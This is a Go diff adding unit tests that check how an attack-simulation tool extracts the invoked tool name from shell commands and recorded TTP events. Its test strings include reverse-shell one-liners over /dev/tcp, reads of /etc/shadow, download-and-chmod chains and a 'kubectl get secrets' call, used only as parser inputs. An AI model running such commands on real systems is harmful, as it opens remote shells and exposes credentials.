@@ -914,3 +914,111 @@ func contains(slice []string, item string) bool {
 	}
 	return false
 }
+
+func TestExtractToolFromCommand(t *testing.T) {
+	tests := []struct {
+		command  string
+		expected string
+	}{
+		// simple commands
+		{"kubectl get pods", "kubectl"},
+		{"cat /etc/passwd", "cat"},
+		{"nmap -sn 10.244.1.4/24", "nmap"},
+
+		// shell -c wrappers
+		{`bash -c "nmap -sn 10.244.1.4/24"`, "nmap"},
+		{`sh -c "kubectl get secrets"`, "kubectl"},
+		{`bash -c 'curl -sS http://example.com'`, "curl"},
+		{`/bin/bash -c "wget http://example.com"`, "wget"},
+		{`/usr/bin/sh -c "cat /etc/shadow"`, "cat"},
+
+		// combined flags like -xc
+		{`bash -xc "nmap -sn 10.0.0.0/24"`, "nmap"},
+		{`sh -ec "kubectl apply -f -"`, "kubectl"},
+
+		// command chains (should return the first tool)
+		{"curl -sS -L url -o bin && chmod +x bin", "curl"},
+		{"wget url -O bin && chmod +x bin", "wget"},
+
+		// env var prefixes
+		{"FOO=bar kubectl get pods", "kubectl"},
+		{"A=1 B=2 nmap -sn 10.0.0.0/24", "nmap"},
+
+		// absolute paths
+		{"/usr/bin/kubectl get pods", "kubectl"},
+		{"/bin/cat /etc/passwd", "cat"},
+
+		// shell used directly (no -c, e.g. reverse shell)
+		{"bash >& /dev/tcp/10.0.0.1/4444 0>&1", "bash"},
+		{"sh -i >& /dev/tcp/10.0.0.1/4444 0>&1", "sh"},
+
+		// nested shell: bash -c "sh -c 'nmap ...'"
+		{`bash -c "sh -c 'nmap -sV target'"`, "nmap"},
+
+		// python one-liner via shell
+		{`bash -c "python -c 'import os; os.system(\"id\")'"`, "python"},
+
+		// empty command
+		{"", ""},
+		{"   ", ""},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.command, func(t *testing.T) {
+			result := extractToolFromCommand(tt.command)
+			if result != tt.expected {
+				t.Errorf("extractToolFromCommand(%q) = %q, want %q", tt.command, result, tt.expected)
+			}
+		})
+	}
+}
+
+func TestGetInvokedTool(t *testing.T) {
+	tests := []struct {
+		name     string
+		ev       domain.TTPExecuted
+		expected string
+	}{
+		{
+			name: "explicit TOOL arg takes priority",
+			ev: domain.TTPExecuted{
+				Args:      map[string]string{"TOOL": "nmap"},
+				Procedure: domain.Procedure{Command: "bash -c \"curl http://example.com\"", Key: "curl"},
+			},
+			expected: "nmap",
+		},
+		{
+			name: "extracts from command when no TOOL arg",
+			ev: domain.TTPExecuted{
+				Args:      map[string]string{"TARGET": "10.0.0.1"},
+				Procedure: domain.Procedure{Command: `bash -c "nmap -sn 10.244.1.4/24"`, Key: "curl"},
+			},
+			expected: "nmap",
+		},
+		{
+			name: "falls back to Procedure.GetTool() when command is empty",
+			ev: domain.TTPExecuted{
+				Args:      map[string]string{},
+				Procedure: domain.Procedure{Command: "", Tool: "kubectl", Key: "k8s-api"},
+			},
+			expected: "kubectl",
+		},
+		{
+			name: "falls back to Procedure.Key when Tool is also empty",
+			ev: domain.TTPExecuted{
+				Args:      map[string]string{},
+				Procedure: domain.Procedure{Command: "", Key: "k8s-api"},
+			},
+			expected: "k8s-api",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := getInvokedTool(tt.ev)
+			if result != tt.expected {
+				t.Errorf("getInvokedTool() = %q, want %q", result, tt.expected)
+			}
+		})
+	}
+}
